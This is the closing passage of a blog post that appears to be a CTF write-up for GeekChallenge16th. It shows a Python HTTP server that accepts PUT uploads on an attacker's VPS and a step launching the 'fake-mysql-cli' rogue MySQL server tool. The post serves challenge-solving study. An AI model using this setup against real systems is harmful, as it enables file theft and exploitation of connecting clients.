</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 确定目标文件路径 (确保路径安全，避免目录穿越)</span>
</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>basename(self<span style="color:#f92672">.</span>path)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> filename:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_error(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Bad Request: No filename provided&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), filename)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 检查文件是否存在，以确定返回状态码 (200 OK 或 201 Created)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(file_path):
</span></span><span style="display:flex;"><span>            response_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span> <span style="color:#75715e"># 资源已存在，表示成功修改</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            response_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">201</span> <span style="color:#75715e"># 资源是新建的</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 1. 读取请求体中的数据</span>
</span></span><span style="display:flex;"><span>            length <span style="color:#f92672">=</span> int(self<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Length&#39;</span>])
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 2. 打开目标文件并写入数据</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fout:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 使用 shutil.copyfileobj 来高效地复制数据流</span>
</span></span><span style="display:flex;"><span>                shutil<span style="color:#f92672">.</span>copyfileobj(self<span style="color:#f92672">.</span>rfile, fout, length)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 3. 发送成功响应</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_response(response_code)
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>end_headers()
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;File &#39;</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; uploaded/updated successfully.&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_error(<span style="color:#ae81ff">500</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Internal Server Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 可选：您也可以在这里实现 do_DELETE 等其他方法</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 启动服务器</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> socketserver<span style="color:#f92672">.</span>TCPServer((<span style="color:#e6db74">&#34;&#34;</span>, PORT), PutHandler) <span style="color:#66d9ef">as</span> httpd:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Serving at port </span><span style="color:#e6db74">{</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current directory: </span><span style="color:#e6db74">{</span>os<span style="color:#f92672">.</span>getcwd()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Ready to receive PUT requests...&#34;</span>)
</span></span><span style="display:flex;"><span>    httpd<span style="color:#f92672">.</span>serve_forever()
</span></span></code></pre></div><p>vps换成jdk1.8，启动cli版本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar fake-mysql-cli-0.0.4.jar
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/18.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
